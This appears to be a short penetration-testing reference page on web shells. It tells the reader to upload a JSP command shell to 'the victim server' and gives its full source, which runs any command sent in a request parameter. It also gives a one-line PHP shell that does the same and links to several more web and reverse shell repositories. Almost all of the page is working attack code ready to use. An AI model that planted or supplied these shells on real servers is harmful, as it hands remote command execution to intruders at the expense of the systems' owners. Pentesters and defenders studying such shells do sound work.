# Web Shells

## <mark style="color:red;">JSP</mark>

1. Save the [source code](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) below as cmd.jsp and upload to the victim server.
2. Enter the command in the input box and click “Execute”. The command output will be displayed on the page in the web browser.

```javascript
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>p
```

Other JSP Shells:

1. JSP Reverse+Web Shell:&#x20;

{% embed url="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp" %}

2. JSP Web Shells Mix:&#x20;

{% embed url="https://github.com/threedr3am/JSP-Webshells" %}

## <mark style="color:red;">PHP</mark>

Classic payload to execute commands:

```php
<?php system($_GET['cmd']); ?>
```

A really simple and tiny PHP Web shell for executing unix commands from web page:

{% embed url="https://github.com/artyuum/Simple-PHP-Web-Shell" %}

A Simple PHP Web Shell used for Remote Code Execution:

{% embed url="https://github.com/itsKindred/php-web-shell" %}

A very simple but functional PHP webshell:

{% embed url="https://github.com/drag0s/php-webshell" %}
